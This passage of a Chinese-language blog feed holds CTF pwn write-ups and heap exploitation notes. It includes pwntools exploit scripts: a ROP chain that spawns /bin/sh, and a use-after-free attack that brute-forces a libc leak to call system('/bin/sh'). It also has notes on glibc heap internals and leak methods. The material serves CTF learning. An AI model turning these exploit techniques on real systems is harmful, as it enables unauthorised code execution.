class="keyword">break</span>*</span><br></pre></td></tr></table></figure><p>或者也可以利用最后的输入，提前写好code（xchg ecx, esp）进行rop</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(<span class="string">'rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: </span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols.c', 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./pwn'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols.so'&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('47.104.190.38', 12001)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"><span class="comment"># libc = ELF('./libc-2.27.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    b *0x8048c5b</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script'</span>, <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">'index:\n'</span>, str(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">xchg ecx, esp</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">sh.sendafter(<span class="string">' much!\n'</span>, payload)</span><br><span class="line">sh.sendlineafter(<span class="string">'size:\n'</span>, str(<span class="number">0x1ff</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>,</span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>,</span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(<span class="string">'me:\n'</span>, flat(layout).ljust(<span class="number">0x80</span>, <span class="string">'\0'</span>) + <span class="string">'/bin/sh\0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h3&gt;&lt;p&gt;程序静态链接，真恶心，呕。&lt;/p&gt;
&lt;p&gt;首先分析程序流&lt;/p&gt;
&lt;p&gt;main&lt;/p&gt;
&lt;img src=&quot;/2019/1
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>汇编笔记</title>
    <link href="http://yoursite.com/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/11/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</id>
    <published>2019-11-11T13:39:49.000Z</published>
    <updated>2019-11-11T15:02:22.743Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>pop指令首先把ESP指向的堆栈元素内容复制到一个32位或64位的操作数中，再增加ESP的值。如果操作数是32位的，ESP+4，如果操作数是64位的，ESP+8。</p><p>​    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop reg/mem32</span><br><span class="line"></span><br><span class="line">pop reg/mem32</span><br></pre></td></tr></table></figure><h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>push指令首先减少ESP的值，再将源操作数复制到堆栈。如果操作数是32位的，ESP-4，如果操作数是64位的，ESP-8。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push reg/mem32</span><br><span class="line">push reg/mem64</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;pop&quot;&gt;&lt;a href=&quot;#pop&quot; class=&quot;headerlink&quot; title=&quot;pop&quot;&gt;&lt;/a&gt;pop&lt;/h3&gt;&lt;p&gt;pop指令首先把ESP指向的堆栈元素内容复制到一个32位或64位的操作数中，再增加ESP的值。如果操作数是32位的，ESP+4，如果
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>第五届上海市网络安全大赛</title>
    <link href="http://yoursite.com/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/11/05/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2019-11-05T13:56:58.000Z</published>
    <updated>2019-11-05T15:10:29.432Z</updated>
    
    <content type="html"><![CDATA[<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>这题没有show，delete里存在uaf漏洞，多了一个login，里面有strcmp函数，根据你输入的长度size，content与堆里保存的数据进行长度为size的content对比。</p><p>add里在你malloc一个堆块后，又会自行malloc一个size为0x20的堆块，里面有一个指针，指向你的ptr  ←就是我们利用的点了。</p><p>贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">'linux'</span> , arch = <span class="string">'amd64'</span> , log_level = <span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./login'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">login</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line">d = sh.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> d == <span class="string">'Login success!'</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="comment">#这里就是爆破对比</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">guess</span><span class="params">(index,prefix)</span>:</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">  <span class="keyword">if</span>(login(index,chr(i)+prefix)):</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="comment">#这里就是从7f开始比对，执行6次</span></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"> addr=<span class="string">''</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">edit(<span class="number">4</span>,chr(<span class="number">0x95</span>-i))</span><br><span class="line">addr = chr(guess(<span class="number">0</span>,addr))+addr</span><br><span class="line"> <span class="keyword">return</span> u64(<span class="string">'\x00'</span>+addr + <span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"pass:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(index,password)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line">sh.sendlineafter(<span class="string">"length:\n"</span>,str(len(password)))</span><br><span class="line">sh.sendlineafter(<span class="string">"password:\n"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">sh.sendlineafter(<span class="string">"Choice:"</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"id:\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">z</span><span class="params">(commond=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(sh,commond)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x90</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="string">'\x90'</span>)<span class="comment">#1</span></span><br><span class="line">base = leak()<span class="number">-0x3c4b00</span></span><br><span class="line">log.success(<span class="string">'libc.addr = '</span> + hex(base))</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">binsh = base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system = base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">add(<span class="number">5</span>,p64(binsh)+p64(system))</span><br><span class="line">sh.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'id:\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">password = <span class="string">'/bin/sh'</span></span><br><span class="line">sh.sendlineafter(<span class="string">'length:\n'</span>,str(len(password)))</span><br><span class="line">sh.sendafter(<span class="string">'password:\n'</span>,password)</span><br><span class="line">exploit()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>（爆破的感觉有点爽）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;login&quot;&gt;&lt;a href=&quot;#login&quot; class=&quot;headerlink&quot; title=&quot;login&quot;&gt;&lt;/a&gt;login&lt;/h3&gt;&lt;p&gt;这题没有show，delete里存在uaf漏洞，多了一个login，里面有strcmp函数，根据你输入的长度size
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>堆的整理</title>
    <link href="http://yoursite.com/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/"/>
    <id>http://yoursite.com/2019/10/29/%E2%80%9C%E5%A0%86%E7%9A%84%E6%95%B4%E7%90%86%E2%80%9D/</id>
    <published>2019-10-29T15:57:08.000Z</published>
    <updated>2020-04-09T00:37:03.792Z</updated>
    
    <content type="html"><![CDATA[<h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p>malloc chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>free chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&apos; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&apos; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>在fasted bin中是LIFO</p><p>在unsorted bin 中是FIFO</p><h3 id="堆叠技巧"><a href="#堆叠技巧" class="headerlink" title="堆叠技巧"></a>堆叠技巧</h3><p> <a href="http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html" target="_blank" rel="noopener">http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a> </p><p>这位师傅的blog里讲的很详细了。</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>malloc_consolidate() 函数是定义在 malloc.c 中的一个函数，用于将 fastbin 中的空闲 chunk 合并整理到 unsorted_bin 中以及进行初始化堆的工作，在 malloc() 以及 free() 中均有可能调用 malloc_consolidate() 函数。</p><h4 id="malloc-consolidate调用条件"><a href="#malloc-consolidate调用条件" class="headerlink" title="malloc_consolidate调用条件"></a>malloc_consolidate调用条件</h4><h5 id="1-malloc-large-bin"><a href="#1-malloc-large-bin" class="headerlink" title="1. malloc large bin"></a>1. malloc large bin</h5><p> 假如malloc的size大于small bin的范围，先调用malloc_consolidate将fastbin 合并为unsorted bin </p><p>在64位系统下，small bin &lt;0x400</p><p>在32位系统下，small bin &lt;0x200</p><h5 id="2-top-chunk不够空间"><a href="#2-top-chunk不够空间" class="headerlink" title="2. top chunk不够空间"></a>2. top chunk不够空间</h5><p>下面是简单的测试代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0x20e48</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x300</span>);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-在free函数在各种合并前后chunk之后的size大于FASTBIN-CONSOLIDATION-THRESHOLD-也就是65536"><a href="#3-在free函数在各种合并前后chunk之后的size大于FASTBIN-CONSOLIDATION-THRESHOLD-也就是65536" class="headerlink" title="3. 在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536"></a>3. 在free函数在各种合并前后chunk之后的size大于FASTBIN_CONSOLIDATION_THRESHOLD 也就是65536</h5><p>比较容易实现的是与top chunk合并后size大于FASTBIN_CONSOLIDATION_THRESHOLD 具体大概是下面的流程</p><ol><li>判断chunk是否属于fastbin，如果不是，继续</li><li>判断chunk是否属于map的，如果不是，继续</li><li>假如下一个chunk是top chunk，合并</li><li>判断当前chunk的size是否大于FASTBIN_CONSOLIDATION_THRESHOLD，假如大于，调用malloc_consolidate</li></ol><p>测试代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">void</span>* h1 = <span class="built_in">malloc</span>(<span class="number">0x68</span>);    </span><br><span class="line"><span class="keyword">void</span>* h2 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="keyword">void</span>* h3 = <span class="built_in">malloc</span>(<span class="number">0xa8</span>);    </span><br><span class="line"><span class="built_in">free</span>(h1);    </span><br><span class="line"><span class="built_in">free</span>(h3);    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆的leak大致方法"><a href="#堆的leak大致方法" class="headerlink" title="堆的leak大致方法"></a>堆的leak大致方法</h3><p>首先需要leak的内容：</p><p>1.主模块的基地址</p><p>2.heap的基地址</p><p>3.libc.so的基地址</p><p>常规流程是通过获取main_arena地址，因为main_arena存在于libc.so中可以通过计算偏移得到libc.so的基地址。再根据main_arena地址获得hook地址</p><p>然后要么system + binsh  要么one_gadget   getshell</p><p>可供leak的漏洞</p><ul><li>堆内存未初始化</li><li>堆溢出</li><li>Use-After-Free</li><li>越界读</li><li>heap extend</li></ul><p>以上都可以进行leak。</p><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><p> uaf漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。 </p><p>根本原因：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</span><br></pre></td></tr></table></figure><p>（所以你看到的某些ptr = null  , ptr = 0。 然后进入到堆块里查看内容，发现堆块里的内容还是能看得到以前写入的数据，但是不能读取，就是这了。它被打上了空闲标记，但是没有真正清除（大概是这个意思吧？））</p><p>一种是直接进行free，且没有进行任何限制的</p><img src="/2019/10/29/“堆的整理”/image-20191103123730845.png"><img src="/2019/10/29/“堆的整理”/image-20191103125527078.png"><p>这种直接malloc,delete,show。</p><p>另一种就是*没悬空，其他该置零的置零。</p><p>UAF配合fasted bin的cyclic list(double free)</p><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><p>off by one 配合chunk overlap ；unlink</p><h3 id="堆的杂记"><a href="#堆的杂记" class="headerlink" title="堆的杂记"></a>堆的杂记</h3><p>注意一点。</p><p>动态链接:</p><p>第一次放入unsorted bin里面的堆块地址距离main_arena为0x58</p><p>main_arena = leak_addr - 0x58</p><p>malloc_hook_addr = main_arena_addr - 0x10</p><p>静态链接:</p><p>第一次放入unsorted bin里面的堆块地址距离malloc_hook为0xD0</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>前向:</p><p>修改第一个堆块的size位即可</p><p>后向:</p><p>修改要覆盖的最后一个堆块的p位和prev_size位即可。</p>]]></content>
    
    <summary type="html">
    
      
      
